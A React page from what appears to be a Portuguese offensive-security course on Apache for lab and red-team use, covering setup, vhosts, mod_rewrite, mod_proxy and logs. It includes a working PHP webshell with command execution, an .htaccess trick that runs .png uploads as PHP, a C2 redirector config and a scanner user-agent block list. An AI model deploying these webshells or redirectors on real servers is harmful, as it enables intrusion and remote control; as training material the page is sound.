import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Apache() {
  return (
    <PageContainer
      title="Apache HTTP Server"
      subtitle="Servir webshells PHP em lab, simular target vulnerável, montar redirector com mod_rewrite e mod_proxy."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Apache vs Nginx pra ofensiva</h2>
      <p>
        Nginx é melhor pra redirector C2 e proxy reverso. <strong>Apache</strong>{" "}
        ainda brilha quando: você precisa simular um alvo realista (CMS PHP
        legacy, .htaccess, mod_php embarcado), explorar features históricas
        (Shellshock via CGI, mod_status info disclosure) ou hospedar payloads
        com <code>mod_rewrite</code> condicional sofisticado.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y apache2",
            out: `Setting up apache2-bin (2.4.62-1) ...
Setting up apache2 (2.4.62-1) ...
Created symlink /etc/systemd/system/multi-user.target.wants/apache2.service`,
            outType: "info",
          },
          {
            comment: "Apache vai conflitar com nginx na 80 — pare um antes do outro",
            cmd: "sudo systemctl stop nginx 2>/dev/null; sudo systemctl start apache2",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "curl -s http://localhost | head -3",
            out: `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
  <head>`,
            outType: "default",
          },
          {
            cmd: "apache2 -v",
            out: `Server version: Apache/2.4.62 (Debian)
Server built:   2024-09-20T10:34:15`,
            outType: "info",
          },
        ]}
      />

      <h2>Estrutura no Debian/Kali</h2>
      <CommandTable
        title="caminhos importantes"
        variations={[
          { cmd: "/etc/apache2/apache2.conf", desc: "Config global (Timeout, MPM, Includes).", output: "Inclui mods-enabled, conf-enabled, sites-enabled." },
          { cmd: "/etc/apache2/sites-available/", desc: "Virtual hosts disponíveis (não ativos).", output: "Use a2ensite/a2dissite." },
          { cmd: "/etc/apache2/sites-enabled/", desc: "Symlinks dos sites ativos.", output: "" },
          { cmd: "/etc/apache2/mods-available/", desc: "Módulos disponíveis (.load + .conf).", output: "Use a2enmod/a2dismod." },
          { cmd: "/etc/apache2/mods-enabled/", desc: "Módulos ativos.", output: "" },
          { cmd: "/etc/apache2/ports.conf", desc: "Define em quais portas Apache escuta.", output: "Listen 80 / Listen 443." },
          { cmd: "/var/www/html/", desc: "DocumentRoot padrão.", output: "" },
          { cmd: "/var/log/apache2/access.log", desc: "Log de requests.", output: "" },
          { cmd: "/var/log/apache2/error.log", desc: "Log de erros (PHP fatal aparece aqui).", output: "" },
        ]}
      />

      <h2>apache2ctl + a2enmod</h2>
      <CommandTable
        title="comandos do dia a dia"
        variations={[
          { cmd: "sudo apache2ctl configtest", desc: "Valida sintaxe da config.", output: "Syntax OK" },
          { cmd: "sudo apache2ctl -S", desc: "Mostra todos os vhosts e como o Apache está roteando.", output: "VirtualHost configuration:..." },
          { cmd: "sudo apache2ctl -M", desc: "Lista módulos carregados.", output: "Loaded Modules: core_module (static), so_module (static)..." },
          { cmd: "sudo a2enmod rewrite", desc: "Habilita módulo (cria symlink em mods-enabled).", output: "Enabling module rewrite. To activate the new configuration, you need to run: systemctl restart apache2" },
          { cmd: "sudo a2dismod status", desc: "Desabilita módulo.", output: "" },
          { cmd: "sudo a2ensite meu-site", desc: "Habilita virtual host.", output: "" },
          { cmd: "sudo a2dissite 000-default", desc: "Desabilita o vhost default.", output: "" },
          { cmd: "sudo a2enconf security", desc: "Habilita config global.", output: "" },
          { cmd: "sudo systemctl reload apache2", desc: "Recarrega config sem matar conexões.", output: "" },
        ]}
      />

      <h2>Virtual host básico</h2>
      <CodeBlock
        language="apache"
        title="/etc/apache2/sites-available/lab.conf"
        code={`<VirtualHost *:80>
    ServerName lab.local
    ServerAlias www.lab.local
    DocumentRoot /var/www/lab

    <Directory /var/www/lab>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog  \${APACHE_LOG_DIR}/lab-error.log
    CustomLog \${APACHE_LOG_DIR}/lab-access.log combined
</VirtualHost>`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo a2ensite lab && sudo a2dissite 000-default && sudo apache2ctl configtest && sudo systemctl reload apache2",
            out: `Enabling site lab.
Site 000-default disabled.
Syntax OK`,
            outType: "success",
          },
          {
            comment: "adicione lab.local em /etc/hosts pra testar",
            cmd: "echo '127.0.0.1 lab.local' | sudo tee -a /etc/hosts",
            out: "127.0.0.1 lab.local",
            outType: "muted",
          },
        ]}
      />

      <h2>.htaccess — onde a magia (e a vulnerabilidade) mora</h2>
      <p>
        Se <code>AllowOverride All</code> está setado no Directory,{" "}
        <strong>cada</strong> request percorre a árvore de pastas procurando{" "}
        <code>.htaccess</code>. Custa I/O mas permite que apps PHP customizem
        comportamento sem reload do Apache. Em pentest é vetor clássico:
        upload de <code>.htaccess</code> que vira <code>.png</code> em PHP
        executável.
      </p>

      <CodeBlock
        language="apache"
        title="/var/www/lab/.htaccess (ataque clássico)"
        code={`# Faz Apache executar .png como PHP — vetor de upload bypass
AddType application/x-httpd-php .png .gif .jpg

# Restringe acesso por IP
<RequireAny>
    Require ip 192.168.56.0/24
    Require ip 10.0.0.0/8
</RequireAny>

# Redirect baseado em User-Agent
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "Googlebot" [NC]
RewriteRule ^(.*)$ /pagina-corporativa.html [L]`}
      />

      <AlertBox type="warning" title="AllowOverride None em produção">
        <p>
          Apache produção sério: <code>AllowOverride None</code> e mover regras
          pro vhost. Ganha performance E fecha o vetor. Em lab/CTF deixa{" "}
          <code>All</code> — esse é o ponto de entrada que você quer explorar.
        </p>
      </AlertBox>

      <h2>mod_rewrite avançado</h2>
      <CodeBlock
        language="apache"
        title="redirect baseado em vários critérios"
        code={`RewriteEngine On

# Força HTTPS
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

# Bloqueia user-agents conhecidos de scanner
RewriteCond %{HTTP_USER_AGENT} "(nikto|sqlmap|nmap|masscan|acunetix|nessus)" [NC]
RewriteRule .* - [F,L]

# Reescreve API legacy
RewriteRule ^api/v1/(.*)$ /api/v2/$1 [L,QSA]

# Pretty URLs
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?path=$1 [L,QSA]`}
      />

      <h2>mod_proxy (reverse proxy)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests headers",
            out: `Considering dependency proxy for proxy_http:
Enabling module proxy.
Enabling module proxy_http.
Enabling module proxy_balancer.
Enabling module lbmethod_byrequests.
Enabling module headers.`,
            outType: "info",
          },
        ]}
      />

      <CodeBlock
        language="apache"
        title="reverse proxy com mod_proxy"
        code={`<VirtualHost *:80>
    ServerName api.empresa-fake.com

    ProxyPreserveHost On
    ProxyRequests Off

    # Sliver C2 escuta em 9443 só no loopback
    <Location "/api/">
        ProxyPass         "https://127.0.0.1:9443/api/"
        ProxyPassReverse  "https://127.0.0.1:9443/api/"
        SSLProxyEngine on
        SSLProxyVerify none
        RequestHeader set X-Real-IP "%{REMOTE_ADDR}s"
    </Location>

    # Resto vai pro decoy
    ProxyPass        "/" "https://www.empresa-real.com/"
    ProxyPassReverse "/" "https://www.empresa-real.com/"
</VirtualHost>`}
      />

      <h2>Hospedar webshell PHP (educacional)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y libapache2-mod-php php",
            out: "(habilita mod_php)",
            outType: "muted",
          },
          {
            cmd: "echo '<?php system($_GET[\"c\"]); ?>' | sudo tee /var/www/lab/cmd.php",
            out: '<?php system($_GET["c"]); ?>',
            outType: "warning",
          },
          {
            cmd: "sudo systemctl reload apache2",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "curl -s 'http://lab.local/cmd.php?c=id;hostname;cat%20/etc/issue'",
            out: `uid=33(www-data) gid=33(www-data) groups=33(www-data)
kali
Kali GNU/Linux Rolling \\n \\l`,
            outType: "error",
          },
        ]}
      />

      <AlertBox type="danger" title="Webshell em produção = quebra de lei">
        <p>
          O exemplo acima é educacional para entender por que upload sem
          validação de extensão é fatal. JAMAIS rode em servidor exposto. Use{" "}
          <strong>caddy/nginx + php-fpm em VM isolada de lab</strong>.
        </p>
      </AlertBox>

      <h2>TLS com Certbot</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y python3-certbot-apache",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo certbot --apache -d lab.exemplo.com -m red@team.local --agree-tos -n",
            out: `Successfully deployed certificate for lab.exemplo.com to /etc/apache2/sites-available/lab-le-ssl.conf
Congratulations! You have successfully enabled HTTPS on https://lab.exemplo.com`,
            outType: "success",
          },
        ]}
      />

      <h2>Logs e monitoring</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo tail -f /var/log/apache2/lab-access.log",
            out: `127.0.0.1 - - [03/Apr/2026:17:11:22 -0300] "GET /cmd.php?c=id HTTP/1.1" 200 56 "-" "curl/8.5.0"
192.168.56.50 - - [03/Apr/2026:17:11:45 -0300] "GET /admin/login.php HTTP/1.1" 404 488 "-" "Mozilla/5.0 sqlmap/1.8"`,
            outType: "info",
          },
          {
            comment: "top 10 IPs que mais bateram",
            cmd: "sudo awk '{print $1}' /var/log/apache2/lab-access.log | sort | uniq -c | sort -rn | head -10",
            out: `   1432 192.168.56.50
    211 127.0.0.1
     54 198.235.24.10`,
            outType: "default",
          },
          {
            comment: "scanners flagrados pelo User-Agent",
            cmd: "sudo grep -E '(sqlmap|nikto|nmap|masscan)' /var/log/apache2/lab-access.log | wc -l",
            out: "847",
            outType: "warning",
          },
        ]}
      />

      <h2>mod_status — info disclosure clássico</h2>
      <CodeBlock
        language="apache"
        title="<Location /server-status> mal configurado"
        code={`<Location "/server-status">
    SetHandler server-status
    # SE deixar 'Require all granted' aqui, qualquer um na internet vê:
    # - URLs sendo requisitadas em tempo real
    # - IPs dos clientes
    # - quanto cada child está consumindo de CPU
    # - parameters em GET (incluindo tokens!)
    Require local
    # ↑ correto: só localhost. Mas em CTF/lab você acha 'all granted'.
</Location>`}
      />

      <PracticeBox
        title="Suba lab com .htaccess vulnerável e bypass de upload"
        goal="Configurar Apache que executa .png como PHP via .htaccess e demonstrar o bypass."
        steps={[
          "Habilite mod_php e configure vhost com AllowOverride All.",
          "Crie /var/www/lab/uploads/.htaccess com AddType para .png.",
          "Suba um 'shell.png' contendo PHP.",
          "Acesse e execute comando arbitrário.",
        ]}
        command={`sudo mkdir -p /var/www/lab/uploads
sudo tee /var/www/lab/uploads/.htaccess >/dev/null <<'EOF'
AddType application/x-httpd-php .png
EOF

echo '<?php echo "RCE OK: "; system($_GET["c"]); ?>' | sudo tee /var/www/lab/uploads/shell.png >/dev/null
sudo chown -R www-data: /var/www/lab
sudo systemctl reload apache2

curl -s 'http://lab.local/uploads/shell.png?c=whoami'`}
        expected={`RCE OK: www-data`}
        verify="Apache executou shell.png como PHP por causa do .htaccess. Esse é o bug em ~50% dos CTFs com upload."
      />

      <AlertBox type="info" title="MPM event vs prefork vs worker">
        <p>
          Default no Debian é <strong>mpm_event</strong> (rápido, async). Se
          usa <code>libapache2-mod-php</code> ele força <strong>mpm_prefork</strong>{" "}
          (lento). Solução moderna: <code>php-fpm</code> + mod_proxy_fcgi e
          mantém event:
          <code>a2dismod php8.3 mpm_prefork && a2enmod mpm_event proxy_fcgi setenvif</code>.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
